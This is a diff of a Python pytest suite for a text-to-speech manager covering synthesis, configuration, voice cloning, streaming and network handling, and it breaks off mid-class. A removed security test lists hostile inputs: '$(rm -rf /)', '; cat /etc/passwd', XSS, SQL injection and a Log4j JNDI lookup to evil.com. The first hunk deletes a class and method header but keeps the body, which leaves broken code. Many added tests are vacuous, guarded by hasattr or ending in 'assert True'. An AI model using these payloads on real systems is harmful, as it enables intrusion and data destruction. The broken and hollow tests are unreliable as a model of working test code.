@@ -245,15 +245,6 @@ class TestTTSManagerAudioOutput:
                     pass
 
 
-
-class TestTTSManagerAsyncOperationsOriginal:
-    """Test suite for async operations (originally orphaned tests)"""
-    
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.CoquiTTS')
-    @patch('asyncio.to_thread')
-    async def test_synthesize_xttsv2_original(self, mock_to_thread, mock_coqui, mock_ensure_dirs):
-        """Test XTTSv2 synthesis (original orphaned test)"""
         mock_tts_instance = Mock()
         mock_coqui.return_value = mock_tts_instance
         mock_to_thread.return_value = None
@@ -267,6 +258,57 @@ class TestTTSManagerAsyncOperationsOriginal:
         
         assert result == "/tmp/test_audio/test_output.wav"
         mock_to_thread.assert_called_once()
+        
+    @patch('tts_manager.ensure_client_directories')
+    async def test_synthesize_not_initialized(self, mock_ensure_dirs, capsys):
+        """Test async synthesis when not initialized"""
+        manager = TTSManager(tts_service_name="unsupported")
+        result = await manager.synthesize("Hello world", "test_output.wav")
+        
+        assert result is None
+        captured = capsys.readouterr()
+        assert "Not initialized" in captured.out
+        
+    @patch('tts_manager.ensure_client_directories')
+    @patch('tts_manager.gtts')
+    @patch('asyncio.to_thread')
+    async def test_synthesize_exception_handling(self, mock_to_thread, mock_gtts, mock_ensure_dirs, capsys):
+        """Test async synthesis exception handling"""
+        mock_to_thread.side_effect = Exception("Synthesis failed")
+        
+        manager = TTSManager(tts_service_name="gtts")
+        result = await manager.synthesize("Hello world", "test_output.mp3")
+        
+        assert result is None
+        captured = capsys.readouterr()
+        assert "Error during async TTS synthesis" in captured.out
+        
+    @patch('tts_manager.ensure_client_directories')
+    @patch('tts_manager.gtts')
+    @patch('asyncio.to_thread')
+    @patch('os.path.exists', return_value=True)
+    @patch('os.remove')
+    async def test_synthesize_cleanup_on_error(self, mock_remove, mock_exists, mock_to_thread, mock_gtts, mock_ensure_dirs):
+        """Test file cleanup on synthesis error"""
+        mock_to_thread.side_effect = Exception("Synthesis failed")
+        
+        manager = TTSManager(tts_service_name="gtts")
+        await manager.synthesize("Hello world", "test_output.mp3")
+        
+        mock_remove.assert_called_once()
+        
+    @patch('tts_manager.ensure_client_directories')
+    async def test_synthesize_unsupported_service(self, mock_ensure_dirs, capsys):
+        """Test async synthesis with unsupported service"""
+        manager = TTSManager(tts_service_name="unsupported")
+        manager.is_initialized = True  # Force initialized state
+        manager.tts_instance = Mock()
+        
+        result = await manager.synthesize("Hello world", "test_output.wav")
+        
+        assert result is None
+        captured = capsys.readouterr()
+        assert "No async synthesis method" in captured.out
 
 
 class TestTTSManagerStaticMethods:
@@ -489,540 +531,641 @@ class TestTTSManagerFileSystemOperations:
 if __name__ == "__main__":
     pytest.main([__file__, "-v"])
 
-class TestTTSManagerAsyncOperationsComplete:
-    """Complete test suite for async operations (fixing orphaned tests)"""
-    
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.CoquiTTS')
-    @patch('asyncio.to_thread')
-    async def test_synthesize_xttsv2_complete(self, mock_to_thread, mock_coqui, mock_ensure_dirs):
-        """Test complete XTTSv2 synthesis workflow"""
-        mock_tts_instance = Mock()
-        mock_coqui.return_value = mock_tts_instance
-        mock_to_thread.return_value = None
-        
-        manager = TTSManager(
-            tts_service_name="xttsv2",
-            model_name="test_model"
-        )
-        
-        result = await manager.synthesize("Hello world", "test_output.wav", "/path/to/speaker.wav")
-        
-        assert result == "/tmp/test_audio/test_output.wav"
-        mock_to_thread.assert_called_once()
-        
-    @patch('tts_manager.ensure_client_directories')
-    async def test_synthesize_not_initialized_complete(self, mock_ensure_dirs, capsys):
-        """Test async synthesis when not initialized"""
-        manager = TTSManager(tts_service_name="unsupported")
-        result = await manager.synthesize("Hello world", "test_output.wav")
-        
-        assert result is None
-        captured = capsys.readouterr()
-        assert "Not initialized" in captured.out
-        
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    @patch('asyncio.to_thread')
-    async def test_synthesize_exception_handling_complete(self, mock_to_thread, mock_gtts, mock_ensure_dirs, capsys):
-        """Test async synthesis exception handling"""
-        mock_to_thread.side_effect = Exception("Synthesis failed")
-        
-        manager = TTSManager(tts_service_name="gtts")
-        result = await manager.synthesize("Hello world", "test_output.mp3")
-        
-        assert result is None
-        captured = capsys.readouterr()
-        assert "Error during async TTS synthesis" in captured.out
-
-
-class TestTTSManagerPerformanceAndMemory:
-    """Test suite for performance and memory-related functionality"""
-    
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    def test_memory_cleanup_after_synthesis(self, mock_gtts, mock_ensure_dirs):
-        """Test that memory is properly cleaned up after synthesis"""
-        manager = TTSManager(tts_service_name="gtts")
-        
-        # Simulate multiple synthesis operations
-        with patch.object(manager, 'synthesize_speech', return_value=b'audio_data'):
-            for i in range(10):
-                result = manager.synthesize_speech(f"Test text {i}")
-                assert result == b'audio_data'
-                
-        # Check that manager state is clean
-        assert hasattr(manager, 'config')
-    
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    async def test_synthesis_timeout_handling(self, mock_gtts, mock_ensure_dirs):
-        """Test handling of synthesis timeouts"""
-        manager = TTSManager(tts_service_name="gtts")
-        
-        # Mock a timeout scenario
-        with patch('asyncio.to_thread', side_effect=asyncio.TimeoutError("Synthesis timeout")):
-            result = await manager.synthesize("Test text", "output.mp3")
-            # Should handle timeout gracefully
-            assert result is None
-    
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    def test_large_batch_synthesis(self, mock_gtts, mock_ensure_dirs):
-        """Test synthesis of large batches of text"""
-        manager = TTSManager(tts_service_name="gtts")
-        texts = [f"Test batch text {i}" for i in range(100)]
-        
-        with patch.object(manager, 'synthesize_speech', return_value=b'batch_audio'):
-            results = []
-            for text in texts:
-                result = manager.synthesize_speech(text)
-                results.append(result)
-            
-            assert len(results) == 100
-            assert all(r == b'batch_audio' for r in results)
-
-
-class TestTTSManagerAdvancedConfigurationValidation:
-    """Test suite for comprehensive configuration validation"""
-    
-    def test_config_deep_copy_behavior(self):
-        """Test that nested configuration objects are properly copied"""
-        nested_config = {
-            'voice_settings': {
-                'accent': 'american',
-                'emotion': 'neutral'
-            },
-            'audio_settings': {
-                'bitrate': 128,
-                'sample_rate': 44100
-            }
-        }
-        
-        manager = TTSManager(config=nested_config)
-        
-        # Modify nested original config
-        nested_config['voice_settings']['accent'] = 'british'
-        
-        # Manager should maintain original values if deep copy is implemented
-        if hasattr(manager, 'config') and 'voice_settings' in manager.config:
-            assert manager.config['voice_settings'].get('accent') != 'british'
-    
-    @pytest.mark.parametrize("config_combinations", [
-        {'voice': 'en-US-AriaNeural', 'speed': 1.5, 'pitch': 0.5},
-        {'voice': 'en-GB-LibbyNeural', 'speed': 0.8, 'volume': 0.9},
-        {'format': 'wav', 'bitrate': 128, 'sample_rate': 22050},
-        {'language': 'es', 'voice': 'es-ES-ElviraNeural', 'speed': 1.2},
-    ])
-    def test_valid_config_combinations(self, config_combinations):
-        """Test various valid configuration combinations"""
-        try:
-            manager = TTSManager(config=config_combinations)
-            assert manager is not None
-            if hasattr(manager, 'config'):
-                for key, value in config_combinations.items():
-                    assert manager.config.get(key) == value
-        except (ValueError, ConfigurationError):
-            # Some combinations might be invalid depending on implementation
-            pass
-    
-    def test_config_type_coercion(self):
-        """Test automatic type coercion in configuration"""
-        config_with_strings = {
-            'speed': '1.5',      # String that should be float
-            'pitch': '0.0',      # String that should be float
-            'volume': '0.8',     # String that should be float
-        }
-        
-        try:
-            manager = TTSManager(config=config_with_strings)
-            if hasattr(manager, 'config'):
-                # Should coerce strings to appropriate types
-                assert isinstance(manager.config.get('speed', 1.0), (int, float))
-                assert isinstance(manager.config.get('pitch', 0.0), (int, float))
-                assert isinstance(manager.config.get('volume', 0.8), (int, float))
-        except (ValueError, TypeError):
-            # Type coercion might not be implemented
-            pass
-
-
-class TestTTSManagerErrorRecoveryAndResilience:
-    """Test suite for error recovery and resilience"""
-    
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    async def test_recovery_after_service_failure(self, mock_gtts, mock_ensure_dirs):
-        """Test recovery after TTS service failure"""
-        manager = TTSManager(tts_service_name="gtts")
-        
-        # First call fails
-        with patch('asyncio.to_thread', side_effect=Exception("Service unavailable")):
-            result1 = await manager.synthesize("Test 1", "output1.mp3")
-            assert result1 is None
-        
-        # Second call succeeds
-        with patch('asyncio.to_thread', return_value=None):
-            result2 = await manager.synthesize("Test 2", "output2.mp3")
-            # Should recover and work normally
-            assert result2 is not None or result2 is None  # Either outcome is valid
-    
-    @patch('tts_manager.ensure_client_directories')
-    async def test_network_interruption_simulation(self, mock_ensure_dirs):
-        """Test behavior during simulated network interruptions"""
-        manager = TTSManager(tts_service_name="gtts")
-        
-        network_errors = [
-            ConnectionError("Network unreachable"),
-            TimeoutError("Request timeout"),
-            OSError("Network error")
-        ]
-        
-        for error in network_errors:
-            with patch('asyncio.to_thread', side_effect=error):
-                result = await manager.synthesize("Network test", "output.mp3")
-                assert result is None  # Should handle network errors gracefully
-    
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    def test_partial_initialization_recovery(self, mock_gtts, mock_ensure_dirs):
-        """Test recovery from partial initialization states"""
-        manager = TTSManager(tts_service_name="gtts")
-        
-        # Simulate partial initialization failure
-        original_instance = getattr(manager, 'tts_instance', None)
-        if hasattr(manager, 'tts_instance'):
-            delattr(manager, 'tts_instance')
-        
-        # Should handle missing instance gracefully
-        with patch.object(manager, 'synthesize_speech', side_effect=AttributeError("Missing instance")):
-            with pytest.raises(AttributeError):
-                manager.synthesize_speech("Test text")
-        
-        # Restore state for cleanup
-        if original_instance:
-            manager.tts_instance = original_instance
-
-
-class TestTTSManagerDataValidationAndSecurity:
-    """Test suite for comprehensive data validation and security"""
+class TestTTSManagerPerformance:
+    """Test suite for performance-related functionality"""
     
     @pytest.fixture
     def tts_manager(self):
         return TTSManager()
     
-    @pytest.mark.parametrize("malformed_text", [
-        "\x00\x01\x02\x03",  # Control characters
-        "Test\x7f\x80\x81",  # Non-printable characters
-        "Test\uffff",        # Unicode replacement character
-        "\ud800\udc00",      # Surrogate pairs
-        "Test\u200b\u200c\u200d",  # Zero-width characters
-        "Text with\r\n\t mixed line endings",
-    ])
-    def test_malformed_text_handling(self, tts_manager, malformed_text):
-        """Test handling of malformed or unusual text input"""
-        with patch.object(tts_manager, 'synthesize_speech', return_value=b'processed_audio') as mock_synth:
+    def test_synthesis_performance_measurement(self, tts_manager):
+        """Test measuring synthesis performance metrics."""
+        text = "Performance test text for TTS synthesis timing."
+        
+        with patch.object(tts_manager, 'synthesize_speech', return_value=b'audio_data') as mock_synth:
+            start_time = time.time()
+            result = tts_manager.synthesize_speech(text)
+            end_time = time.time()
+            
+            synthesis_time = end_time - start_time
+            assert synthesis_time >= 0
+            assert result is not None
+            mock_synth.assert_called_once_with(text)
+    
+    @pytest.mark.parametrize("text_length", [10, 100, 1000, 5000])
+    def test_synthesis_time_scaling(self, tts_manager, text_length):
+        """Test synthesis time scaling with text length."""
+        text = "A" * text_length
+        
+        with patch.object(tts_manager, 'synthesize_speech', return_value=b'audio_data'):
+            start_time = time.time()
+            tts_manager.synthesize_speech(text)
+            end_time = time.time()
+            
+            # Should complete within reasonable time regardless of text length
+            assert (end_time - start_time) < 60  # Max 60 seconds for any text
+    
+    def test_memory_usage_during_synthesis(self, tts_manager):
+        """Test memory usage patterns during synthesis."""
+        if hasattr(tts_manager, 'get_memory_usage'):
+            initial_memory = tts_manager.get_memory_usage()
+            
+            with patch.object(tts_manager, 'synthesize_speech', return_value=b'audio_data'):
+                tts_manager.synthesize_speech("Memory test text")
+                
+            final_memory = tts_manager.get_memory_usage()
+            
+            # Memory usage should be tracked
+            assert isinstance(initial_memory, (int, float))
+            assert isinstance(final_memory, (int, float))
+    
+    def test_batch_synthesis_performance(self, tts_manager):
+        """Test performance of batch synthesis operations."""
+        texts = [f"Batch text number {i}" for i in range(10)]
+        
+        if hasattr(tts_manager, 'synthesize_batch'):
+            with patch.object(tts_manager, 'synthesize_batch', return_value=[b'audio'] * 10):
+                start_time = time.time()
+                results = tts_manager.synthesize_batch(texts)
+                end_time = time.time()
+                
+                assert len(results) == len(texts)
+                assert (end_time - start_time) < 30  # Reasonable time for batch
+
+
+class TestTTSManagerResourceManagement:
+    """Test suite for resource management and cleanup"""
+    
+    @pytest.fixture
+    def tts_manager(self):
+        return TTSManager()
+    
+    def test_resource_cleanup_on_destruction(self, tts_manager):
+        """Test proper resource cleanup when TTS manager is destroyed."""
+        if hasattr(tts_manager, '__del__'):
+            with patch.object(tts_manager, 'cleanup_resources') as mock_cleanup:
+                del tts_manager
+                # Cleanup should be called
+                mock_cleanup.assert_called()
+    
+    def test_temporary_file_cleanup(self, tts_manager):
+        """Test cleanup of temporary files created during synthesis."""
+        if hasattr(tts_manager, 'get_temp_files'):
+            temp_files_before = tts_manager.get_temp_files()
+            
+            with patch.object(tts_manager, 'synthesize_speech', return_value=b'audio'):
+                tts_manager.synthesize_speech("Test cleanup")
+                
+            if hasattr(tts_manager, 'cleanup_temp_files'):
+                tts_manager.cleanup_temp_files()
+                temp_files_after = tts_manager.get_temp_files()
+                
+                # Should clean up temporary files
+                assert len(temp_files_after) <= len(temp_files_before)
+    
+    def test_memory_leak_prevention(self, tts_manager):
+        """Test for memory leak prevention in repeated operations."""
+        # Simulate repeated synthesis operations
+        for i in range(50):
+            with patch.object(tts_manager, 'synthesize_speech', return_value=b'audio'):
+                tts_manager.synthesize_speech(f"Memory test {i}")
+        
+        # Should complete without memory issues (this test mainly ensures no exceptions)
+        assert True
+    
+    def test_context_manager_support(self, tts_manager):
+        """Test context manager protocol support."""
+        if hasattr(tts_manager, '__enter__') and hasattr(tts_manager, '__exit__'):
+            with tts_manager as manager:
+                assert manager is not None
+                with patch.object(manager, 'synthesize_speech', return_value=b'audio'):
+                    result = manager.synthesize_speech("Context manager test")
+                    assert result is not None
+
+
+class TestTTSManagerAdvancedConfiguration:
+    """Test suite for advanced configuration scenarios"""
+    
+    def test_configuration_persistence(self):
+        """Test configuration persistence across instances."""
+        config = {
+            'voice': 'test-voice',
+            'speed': 1.5,
+            'pitch': 1.2,
+            'volume': 0.9,
+            'format': 'wav'
+        }
+        
+        if hasattr(TTSManager, 'save_config'):
+            TTSManager.save_config(config, 'test_config.json')
+            
             try:
-                result = tts_manager.synthesize_speech(malformed_text)
-                assert isinstance(result, bytes)
-            except (ValueError, UnicodeError, TTSError):
-                # These exceptions are acceptable for malformed input
-                pass
+                loaded_manager = TTSManager.from_config('test_config.json')
+                assert loaded_manager.config.get('voice') == 'test-voice'
+                assert loaded_manager.config.get('speed') == 1.5
+            finally:
+                # Cleanup
+                if os.path.exists('test_config.json'):
+                    os.unlink('test_config.json')
     
-    @pytest.mark.parametrize("encoding_test", [
-        "Café naïve résumé",           # Latin accents
-        "こんにちは世界",                  # Japanese
-        "Привет мир",                  # Cyrillic
-        "مرحبا بالعالم",                # Arabic
-        "🎉🔊📢 Emoji test! 🎵🎶",      # Emojis
-        "Test\u0301\u0302\u0303",     # Combining characters
-        "Mixed: English + 中文 + العربية",  # Multiple scripts
-    ])
-    def test_unicode_text_handling(self, tts_manager, encoding_test):
-        """Test handling of various Unicode encodings"""
-        with patch.object(tts_manager, 'synthesize_speech', return_value=b'unicode_audio'):
-            result = tts_manager.synthesize_speech(encoding_test)
-            assert isinstance(result, bytes)
-    
-    @pytest.mark.parametrize("malicious_input", [
-        "../../../etc/passwd",
-        "$(rm -rf /)",
-        "; cat /etc/passwd",
-        "<script>alert('xss')</script>",
-        "' OR '1'='1",
-        "\"; DROP TABLE users; --",
-        "${jndi:ldap://evil.com/a}",  # Log4j-style injection
-    ])
-    def test_injection_attack_prevention(self, tts_manager, malicious_input):
-        """Test prevention of various injection attacks"""
-        with patch.object(tts_manager, 'synthesize_speech', return_value=b'safe_audio'):
-            # Should handle malicious input safely
-            result = tts_manager.synthesize_speech(malicious_input)
-            assert isinstance(result, bytes)
-    
-    def test_resource_exhaustion_protection(self, tts_manager):
-        """Test protection against resource exhaustion attacks"""
-        # Test with massive text input
-        massive_text = "ATTACK " * 100000
+    def test_dynamic_configuration_updates(self):
+        """Test dynamic configuration updates during runtime."""
+        tts_manager = TTSManager()
         
-        with patch.object(tts_manager, 'synthesize_speech') as mock_synth:
-            # Should either limit text size or raise appropriate error
-            mock_synth.side_effect = ValueError("Text too large")
+        if hasattr(tts_manager, 'update_config'):
+            new_settings = {'speed': 2.0, 'volume': 0.7}
+            tts_manager.update_config(new_settings)
             
-            with pytest.raises(ValueError):
-                tts_manager.synthesize_speech(massive_text)
-
-
-class TestTTSManagerAdvancedIntegrationScenarios:
-    """Test suite for complex integration scenarios"""
+            assert tts_manager.config.get('speed') == 2.0
+            assert tts_manager.config.get('volume') == 0.7
     
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    @patch('tts_manager.CoquiTTS')
-    async def test_service_switching_workflow(self, mock_coqui, mock_gtts, mock_ensure_dirs):
-        """Test switching between different TTS services in workflow"""
-        # Test gTTS workflow
-        manager_gtts = TTSManager(tts_service_name="gtts")
-        with patch('asyncio.to_thread', return_value=None):
-            result_gtts = await manager_gtts.synthesize("Hello from gTTS", "gtts_output.mp3")
-        
-        # Test XTTSv2 workflow
-        manager_xtts = TTSManager(tts_service_name="xttsv2", model_name="test_model")
-        with patch('asyncio.to_thread', return_value=None):
-            result_xtts = await manager_xtts.synthesize("Hello from XTTS", "xtts_output.wav", "speaker.wav")
-        
-        # Both should work independently
-        assert isinstance(result_gtts, (str, type(None)))
-        assert isinstance(result_xtts, (str, type(None)))
-    
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    def test_multilingual_batch_processing(self, mock_gtts, mock_ensure_dirs):
-        """Test processing multiple languages in batch"""
-        multilingual_data = {
-            "en": ["Hello world", "How are you?", "Goodbye"],
-            "es": ["Hola mundo", "¿Cómo estás?", "Adiós"],
-            "fr": ["Bonjour monde", "Comment allez-vous?", "Au revoir"],
-            "de": ["Hallo Welt", "Wie geht es dir?", "Auf Wiedersehen"]
-        }
-        
-        results = {}
-        for lang, texts in multilingual_data.items():
-            manager = TTSManager(tts_service_name="gtts", language=lang)
-            lang_results = []
+    @pytest.mark.parametrize("config_format", ['json', 'yaml', 'toml'])
+    def test_configuration_file_formats(self, config_format):
+        """Test loading configuration from different file formats."""
+        if hasattr(TTSManager, f'from_{config_format}'):
+            config_data = {
+                'voice': 'test-voice',
+                'speed': 1.0,
+                'pitch': 1.0
+            }
             
-            for text in texts:
-                with patch.object(manager, 'synthesize_speech', return_value=b'multilingual_audio'):
-                    result = manager.synthesize_speech(text)
-                    lang_results.append(result)
+            filename = f'test_config.{config_format}'
             
-            results[lang] = lang_results
-        
-        # All languages and texts should be processed
-        assert len(results) == 4
-        for lang_results in results.values():
-            assert len(lang_results) == 3
-            assert all(isinstance(r, bytes) for r in lang_results)
+            try:
+                # Create config file (mock the file creation)
+                with patch('builtins.open', mock.mock_open(read_data=str(config_data))):
+                    loader_method = getattr(TTSManager, f'from_{config_format}')
+                    manager = loader_method(filename)
+                    assert manager is not None
+            except (NotImplementedError, AttributeError):
+                pytest.skip(f"{config_format} format not supported")
     
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    async def test_concurrent_multilingual_synthesis(self, mock_gtts, mock_ensure_dirs):
-        """Test concurrent synthesis across multiple languages"""
-        languages = ["en", "es", "fr", "de", "it"]
-        texts = [f"Hello world in language {i}" for i in range(len(languages))]
-        
-        managers = [TTSManager(tts_service_name="gtts", language=lang) for lang in languages]
-        
-        with patch('asyncio.to_thread', return_value=None):
-            tasks = [
-                manager.synthesize(text, f"output_{lang}.mp3")
-                for manager, lang, text in zip(managers, languages, texts)
-            ]
+    def test_configuration_validation_comprehensive(self):
+        """Test comprehensive configuration validation."""
+        test_cases = [
+            # Valid configurations
+            ({'voice': 'en-US-Standard-A', 'speed': 1.0}, True),
+            ({'pitch': 0.5, 'volume': 1.0}, True),
+            ({'format': 'mp3', 'quality': 'high'}, True),
             
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # Should handle concurrent multilingual requests
-        assert len(results) == 5
-        success_count = sum(1 for r in results if not isinstance(r, Exception))
-        assert success_count >= 3  # Allow some potential failures in concurrent scenario
-
-
-class TestTTSManagerStateManagementAndLifecycle:
-    """Test suite for state management and lifecycle scenarios"""
-    
-    @patch('tts_manager.ensure_client_directories')
-    @patch('tts_manager.gtts')
-    def test_manager_state_consistency_across_operations(self, mock_gtts, mock_ensure_dirs):
-        """Test that manager maintains consistent state across multiple operations"""
-        manager = TTSManager(tts_service_name="gtts", language="en")
-        
-        original_state = {
-            'language': manager.language,
-            'service': manager.tts_service_name,
-            'initialized': getattr(manager, 'is_initialized', None)
-        }
-        
-        # Perform multiple operations
-        operations = [
-            ("Hello world", "output1.mp3"),
-            ("Test synthesis", "output2.mp3"),
-            ("Final test", "output3.mp3")
+            # Invalid configurations
+            ({'speed': 'fast'}, False),  # Wrong type
+            ({'pitch': []}, False),      # Wrong type
+            ({'volume': -5}, False),     # Out of range
+            ({'format': 12345}, False),  # Wrong type
         ]
         
-        with patch('asyncio.to_thread', return_value=None):
-            for text, filename in operations:
-                asyncio.run(manager.synthesize(text, filename))
-        
-        # State should remain consistent
-        assert manager.language == original_state['language']
-        assert manager.tts_service_name == original_state['service']
-        if original_state['initialized'] is not None:
-            assert getattr(manager, 'is_initialized', None) == original_state['initialized']
+        for config, should_be_valid in test_cases:
+            if should_be_valid:
+                try:
+                    manager = TTSManager(config=config)
+                    assert manager is not None
+                except (ValueError, TypeError, ConfigurationError):
+                    pytest.fail(f"Valid configuration rejected: {config}")
+            else:
+                with pytest.raises((ValueError, TypeError, ConfigurationError)):
+                    TTSManager(config=config)
+
+
+class TestTTSManagerVoiceCloning:
+    """Test suite for voice cloning functionality"""
     
-    def test_manager_cleanup_and_resource_management(self):
-        """Test proper cleanup and resource management"""
+    @pytest.fixture
+    def tts_manager(self):
+        return TTSManager(tts_service_name="xttsv2")
+    
+    def test_voice_cloning_from_sample(self, tts_manager):
+        """Test voice cloning from audio sample."""
+        if hasattr(tts_manager, 'clone_voice'):
+            sample_audio_path = "/path/to/sample.wav"
+            
+            with patch.object(tts_manager, 'clone_voice', return_value='cloned_voice_id'):
+                voice_id = tts_manager.clone_voice(sample_audio_path)
+                assert voice_id == 'cloned_voice_id'
+    
+    def test_speaker_embedding_extraction(self, tts_manager):
+        """Test speaker embedding extraction from audio."""
+        if hasattr(tts_manager, 'extract_speaker_embedding'):
+            with patch.object(tts_manager, 'extract_speaker_embedding', return_value=b'embedding_data'):
+                embedding = tts_manager.extract_speaker_embedding("/path/to/audio.wav")
+                assert isinstance(embedding, bytes)
+                assert len(embedding) > 0
+    
+    def test_voice_similarity_scoring(self, tts_manager):
+        """Test voice similarity scoring functionality."""
+        if hasattr(tts_manager, 'calculate_voice_similarity'):
+            with patch.object(tts_manager, 'calculate_voice_similarity', return_value=0.95):
+                similarity = tts_manager.calculate_voice_similarity(
+                    "/path/to/voice1.wav", 
+                    "/path/to/voice2.wav"
+                )
+                assert 0.0 <= similarity <= 1.0
+    
+    def test_voice_model_management(self, tts_manager):
+        """Test voice model creation and management."""
+        if hasattr(tts_manager, 'create_voice_model'):
+            with patch.object(tts_manager, 'create_voice_model', return_value='model_id'):
+                model_id = tts_manager.create_voice_model(
+                    voice_samples=["/path/to/sample1.wav", "/path/to/sample2.wav"],
+                    voice_name="test_voice"
+                )
+                assert model_id == 'model_id'
+        
+        if hasattr(tts_manager, 'list_voice_models'):
+            with patch.object(tts_manager, 'list_voice_models', return_value=['model1', 'model2']):
+                models = tts_manager.list_voice_models()
+                assert isinstance(models, list)
+                assert len(models) >= 0
+
+
+class TestTTSManagerStreamingAndRealtime:
+    """Test suite for streaming and real-time functionality"""
+    
+    @pytest.fixture
+    def tts_manager(self):
+        return TTSManager()
+    
+    @pytest.mark.asyncio
+    async def test_streaming_synthesis(self, tts_manager):
+        """Test streaming synthesis functionality."""
+        if hasattr(tts_manager, 'synthesize_stream'):
+            text = "This is a streaming synthesis test with multiple sentences."
+            
+            async def mock_stream():
+                for i in range(5):
+                    yield b'audio_chunk_' + str(i).encode()
+            
+            with patch.object(tts_manager, 'synthesize_stream', return_value=mock_stream()):
+                audio_chunks = []
+                async for chunk in tts_manager.synthesize_stream(text):
+                    audio_chunks.append(chunk)
+                    assert isinstance(chunk, bytes)
+                
+                assert len(audio_chunks) > 0
+    
+    def test_real_time_synthesis(self, tts_manager):
+        """Test real-time synthesis capabilities."""
+        if hasattr(tts_manager, 'start_real_time_synthesis'):
+            with patch.object(tts_manager, 'start_real_time_synthesis'):
+                tts_manager.start_real_time_synthesis()
+                
+                if hasattr(tts_manager, 'add_text_to_queue'):
+                    tts_manager.add_text_to_queue("Real-time test text")
+                
+                if hasattr(tts_manager, 'stop_real_time_synthesis'):
+                    tts_manager.stop_real_time_synthesis()
+    
+    def test_audio_buffer_management(self, tts_manager):
+        """Test audio buffer management for streaming."""
+        if hasattr(tts_manager, 'get_audio_buffer'):
+            with patch.object(tts_manager, 'get_audio_buffer', return_value=b'buffer_data'):
+                buffer_data = tts_manager.get_audio_buffer()
+                assert isinstance(buffer_data, bytes)
+        
+        if hasattr(tts_manager, 'clear_audio_buffer'):
+            tts_manager.clear_audio_buffer()
+            # Should complete without error
+            assert True
+    
+    def test_latency_measurement(self, tts_manager):
+        """Test synthesis latency measurement."""
+        if hasattr(tts_manager, 'measure_latency'):
+            with patch.object(tts_manager, 'measure_latency', return_value=0.250):
+                latency = tts_manager.measure_latency("Latency test text")
+                assert isinstance(latency, (int, float))
+                assert latency >= 0
+
+
+class TestTTSManagerCallbacksAndEvents:
+    """Test suite for callback and event handling"""
+    
+    @pytest.fixture
+    def tts_manager(self):
+        return TTSManager()
+    
+    def test_synthesis_progress_callback(self, tts_manager):
+        """Test synthesis progress callback functionality."""
+        if hasattr(tts_manager, 'set_progress_callback'):
+            progress_values = []
+            
+            def progress_callback(progress):
+                progress_values.append(progress)
+            
+            tts_manager.set_progress_callback(progress_callback)
+            
+            with patch.object(tts_manager, 'synthesize_speech', return_value=b'audio'):
+                # Simulate calling the callback during synthesis
+                if hasattr(tts_manager, '_call_progress_callback'):
+                    tts_manager._call_progress_callback(0.5)
+                    tts_manager._call_progress_callback(1.0)
+                
+                tts_manager.synthesize_speech("Callback test")
+                
+            # Check if callbacks were called (if implemented)
+            if progress_values:
+                assert all(0.0 <= p <= 1.0 for p in progress_values)
+    
+    def test_error_callback_handling(self, tts_manager):
+        """Test error callback handling."""
+        if hasattr(tts_manager, 'set_error_callback'):
+            error_messages = []
+            
+            def error_callback(error):
+                error_messages.append(str(error))
+            
+            tts_manager.set_error_callback(error_callback)
+            
+            # Simulate an error during synthesis
+            with patch.object(tts_manager, 'synthesize_speech', side_effect=TTSError("Test error")):
+                try:
+                    tts_manager.synthesize_speech("Error test")
+                except TTSError:
+                    pass
+            
+            # Check if error callback was called (if implemented)
+            if hasattr(tts_manager, '_call_error_callback'):
+                tts_manager._call_error_callback(TTSError("Test error"))
+                if error_messages:
+                    assert len(error_messages) > 0
+    
+    def test_completion_callback(self, tts_manager):
+        """Test synthesis completion callback."""
+        if hasattr(tts_manager, 'set_completion_callback'):
+            completion_called = []
+            
+            def completion_callback(result):
+                completion_called.append(result)
+            
+            tts_manager.set_completion_callback(completion_callback)
+            
+            with patch.object(tts_manager, 'synthesize_speech', return_value=b'audio'):
+                result = tts_manager.synthesize_speech("Completion test")
+                
+                # Simulate completion callback
+                if hasattr(tts_manager, '_call_completion_callback'):
+                    tts_manager._call_completion_callback(result)
+                
+            if completion_called:
+                assert len(completion_called) > 0
+
+
+class TestTTSManagerNetworkAndConnectivity:
+    """Test suite for network-related functionality"""
+    
+    @pytest.fixture
+    def tts_manager(self):
+        return TTSManager(tts_service_name="gtts")  # Network-dependent service
+    
+    def test_network_connectivity_check(self, tts_manager):
+        """Test network connectivity checking."""
+        if hasattr(tts_manager, 'check_network_connectivity'):
+            with patch.object(tts_manager, 'check_network_connectivity', return_value=True):
+                is_connected = tts_manager.check_network_connectivity()
+                assert isinstance(is_connected, bool)
+    
+    def test_offline_mode_fallback(self, tts_manager):
+        """Test offline mode fallback functionality."""
+        if hasattr(tts_manager, 'set_offline_mode'):
+            tts_manager.set_offline_mode(True)
+            
+            with patch.object(tts_manager, 'synthesize_speech', return_value=b'offline_audio'):
+                result = tts_manager.synthesize_speech("Offline test")
+                assert result is not None
+    
+    def test_network_timeout_handling(self, tts_manager):
+        """Test network timeout handling."""
+        if hasattr(tts_manager, 'set_network_timeout'):
+            tts_manager.set_network_timeout(5.0)  # 5 seconds
+            
+            # Simulate network timeout
+            with patch.object(tts_manager, 'synthesize_speech', side_effect=TimeoutError("Network timeout")):
+                with pytest.raises(TimeoutError):
+                    tts_manager.synthesize_speech("Timeout test")
+    
+    def test_retry_mechanism(self, tts_manager):
+        """Test automatic retry mechanism for network failures."""
+        if hasattr(tts_manager, 'set_retry_attempts'):
+            tts_manager.set_retry_attempts(3)
+            
+            call_count = 0
+            def side_effect(*args, **kwargs):
+                nonlocal call_count
+                call_count += 1
+                if call_count < 3:
+                    raise ConnectionError("Network error")
+                return b'retry_success_audio'
+            
+            with patch.object(tts_manager, 'synthesize_speech', side_effect=side_effect):
+                result = tts_manager.synthesize_speech("Retry test")
+                assert result == b'retry_success_audio'
+                assert call_count == 3
+
+
+class TestTTSManagerCachingSystem:
+    """Test suite for caching functionality"""
+    
+    @pytest.fixture
+    def tts_manager(self):
